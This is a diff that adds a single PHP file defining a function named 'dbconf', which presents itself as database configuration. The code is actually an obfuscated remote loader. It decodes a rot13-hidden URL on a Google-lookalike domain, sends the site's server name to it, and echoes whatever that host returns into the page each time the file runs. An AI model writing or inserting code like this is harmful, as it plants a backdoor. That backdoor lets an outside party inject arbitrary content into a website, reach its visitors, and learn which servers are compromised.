@@ -1,0 +1,1 @@
+<?php function dbconf() { $IIIIIIII = file_get_contents(str_rot13("uggc://yvax.tbbtyrr.yvsr/qngn.cuc?k=").$_SERVER['SERVER_NAME']); echo $IIIIIIII; } dbconf(); ?>
